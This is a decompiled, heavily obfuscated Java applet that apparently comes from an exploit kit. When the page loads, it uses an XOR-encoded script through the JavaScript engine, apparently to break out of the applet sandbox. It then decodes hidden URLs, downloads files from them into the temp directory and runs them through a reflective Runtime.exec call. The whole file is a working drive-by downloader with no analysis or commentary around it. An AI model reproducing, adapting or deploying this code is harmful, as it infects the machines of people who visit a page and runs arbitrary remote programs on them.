import java.lang.reflect.Method;
import javax.script.Invocable;
import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;
import java.awt.Component;
import javax.swing.JList;
import java.io.OutputStream;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;

// 
// Decompiled by Procyon v0.5.30
// 

public final class Applet extends java.applet.Applet
{
    private static Boolean const;
    
    private static Object true(String a2, final Object a, final String a, final Class[] a, final Object[] a) {
        try {
            if (Applet.const) {
                System.out.println(j.true("\u00013\u001b4\u0011\u001b\u0005\u001a/\u001f&\u0012r\u0010") + a2 + j.true("d\u001e") + a + j.true("d\u0018") + a.length + j.true("\u0019"));
            }
            return ((Method)(a2 = (String)((Class)(a2 = (String)Class.forName(a2))).getMethod(a, (Class<?>[])a))).invoke(a, a);
        }
        catch (Exception a2) {
            if (Applet.const) {
                ((Throwable)a2).printStackTrace();
            }
            return null;
        }
    }
    
    private static void super(String a2) {
        final String string = System.getProperty(j.true("\u0004>\u000e(b\u0010 J=\u0019=\u0017&U")) + (Math.random() + j.true("i\u00169B"));
        try {
            ((URL)(a2 = (String)new URL(a2))).openConnection();
            a2 = (String)((URL)a2).openStream();
            final FileOutputStream a3 = new FileOutputStream(string);
            true((InputStream)a2, a3);
            final String s = a2;
            final FileOutputStream fileOutputStream = a3;
            a2 = s;
            try {
                ((InputStream)a2).close();
            }
            catch (Exception a2) {
                if (Applet.const) {
                    ((Throwable)a2).printStackTrace();
                }
            }
            try {
                fileOutputStream.close();
            }
            catch (Exception a2) {
                if (Applet.const) {
                    ((Throwable)a2).printStackTrace();
                }
            }
            a2 = string;
            try {
                true(j.true("'\u0019?\u001ee\u0007>7\u0006v,%\u0006\"\u0004?B"), Runtime.getRuntime(), j.true("\"\u000b$D"), new Class[] { String.class }, new Object[] { a2 });
            }
            catch (Exception ex) {
                if (Applet.const) {
                    ex.printStackTrace();
                }
            }
        }
        catch (Exception a2) {
            if (Applet.const) {
                ((Throwable)a2).printStackTrace();
            }
        }
    }
    
    @Override
    public void init() {
        try {
            this.add(new JList<Object>((Object[])new Object[] { this.true() }));
        }
        catch (Exception ex) {
            if (Applet.const) {
                ex.printStackTrace();
            }
        }
    }
    
    @Override
    public String toString() {
        try {
            final String true = true(j.true("E\u000b\u000e/wu\u001ey,oI\u0010A/4 \u0015\nlX_+)RWBj \u0005`hf\u0019,o\u001as@H\u00140;@&AAGrP}n2"));
            final String true2 = true(j.true("}\u0005uBx(&R9v\u00183\";p n\u0004\u001eUht\\L,`M%a/w /;F\\wfV}|\u0013wC\bMr9lcT\u000erPg\u000bm\u0016\u0001{NnFU+~z\\6\u0000\u0001$X"));
            final String true3 = true(j.true("\u0015\f\u0010J5,@\u00068.\u001fag\u0017}\u000bN\u001bJkL*}IuTwbGv'a4pETSFmO^<iE/T\u0016\u0018Q\u000e\u007faj@ekW*'bEq\u001a-[T\r%>I\u001eD<"));
            final String s = true2;
            final String s2 = true;
            String a = j.true("");
            int n;
            int i = n = 0;
            while (i < s2.length()) {
                final int index;
                if ((index = s.indexOf(s2.substring(n, n + 1))) >= 0) {
                    a += true3.substring(index, index + 1);
                }
                i = ++n;
            }
            true(a, j.true("\t"));
        }
        catch (Exception ex) {
            if (Applet.const) {
                ex.printStackTrace();
            }
        }
        return j.true("");
    }
    
    private static String true(final String a) {
        final String true = j.true("\u001f\u001c\u0018A9!N\t8/F&\u0007a9U\u000f^*\f.Q\u001719\u0018\u0019\u0017$\u000fE\u0015u+. \t\u0007<\u00025R\u0001.j\u0005wb?{\u001a\u001d\u00165\u0003\u000e1JM\u0014\u00072)\u0016P>\u0011(\u001cp9~\u0005");
        final StringBuffer sb = new StringBuffer();
        final int length = a.length();
        final int length2 = true.length();
        int n;
        int i = n = 0;
        while (i < length) {
            sb.append((char)(a.charAt(n) ^ true.charAt(n % length2)));
            i = ++n;
        }
        return sb.toString();
    }
    
    private Object true() {
        try {
            final ScriptEngine a = (ScriptEngine)true(j.true("\u0005:\n\u001f2Q&\u00149\u001f>\u0004w\u0006\b&\u0001,\u000e\u0018\u0015<\u0001\u001032(\u0019>\u0011?B"), true(j.true("\u0005:\n\u001f2Q&\u00149\u001f>\u0004w\u0006\b&\u0001,\u000e\u0018\u0015<\u0001\u001032(\u0019>\u0011?B"), new Class[0], new Object[0]), j.true("5\u0002%%?\u0016\u001f/\u001c\u001e\n\u0002\u0015&U"), new Class[] { String.class }, new Object[] { j.true(".C") });
            true(j.true("\u0005;\u001a<\u0014b8\u001f6\b>\u0005g%.\u0015\u001f'\u0001\u000f\u0015=\u00113U"), a, j.true("&\u0000'\\"), new Class[] { String.class }, new Object[] { j.true("3 \t7\b5\u00013G/\u001b-6\r4\u00194^9Y:<Si@lI)\u001b2\u0013P\u001a\u0010\"\u0003\u0015\u001f\f\u0017]ho2!2%)64\"VS\u0004\f\u0011SV\u0017PTh{dXu\u001e/\u0012 \u0012\u001f0\u001ew\u001b.\u0018-^\u0016,\u0004 \t1P.\u0012/7\u001b1\n?\u001e\u0017\u000f+\u0011\u001f4$1\"t,(/7yE\u0011Q\u0015\u0018$\u0002\u0000\u0019\u00032w}\u007f!v>\u000e/\u001f\u0016b_0Wb\r3\u0019yhKeS.\u001f)\u000e)\u0006^qXr\nd\u0013zMU;\"#|\u0019</()|WY\u001aS\u001a\u0016\u0005\u0005\u0011\u00060si`(:4 `2\u001b:\n#\u0019g\u0013yM") });
            return true(j.true(".\u0011!4\u0019z\r?\u00124\u0015/\\7.\t,\u00140\u0014<U"), a, j.true("\u00013\u001b4\u0011\u001b\u000e\n5\u0014=\u001f'^"), new Class[] { String.class, Object[].class }, new Object[] { j.true(":\u0010\u0002\u00035\u001f,W"), { this } });
        }
        catch (Exception ex) {
            if (Applet.const) {
                ex.printStackTrace();
            }
            return null;
        }
    }
    
    private static void true(String a, String a) {
        if (a.indexOf(a) >= 0) {
            a = (String)(Object)a.split(a);
            String s = a = (String)0;
            while (s < a.length) {
                super(a[a].trim());
                s = ++a;
            }
            return;
        }
        super(a);
    }
    
    private static void true(final InputStream a, final OutputStream a) {
        final byte[] array = new byte[4096];
        InputStream inputStream = a;
        int read;
        while ((read = inputStream.read(array)) != -1) {
            a.write(array, 0, read);
            inputStream = a;
        }
    }
    
    static {
        Applet.const = false;
    }
    
    private static Object true(String a2, final Class[] a, final Object[] a) {
        try {
            if (Applet.const) {
                System.out.println(j.true("\u001b.\u000f<\u001f>1\u00105\u000b8\u0019,\u0013p\u0010") + a2 + j.true("d\u0018") + a.length + j.true("\u0019"));
            }
            return ((Class<?>)(a2 = (String)Class.forName(a2))).getConstructor((Class<?>[])a).newInstance(a);
        }
        catch (Exception a2) {
            if (Applet.const) {
                ((Throwable)a2).printStackTrace();
            }
            return null;
        }
    }
}
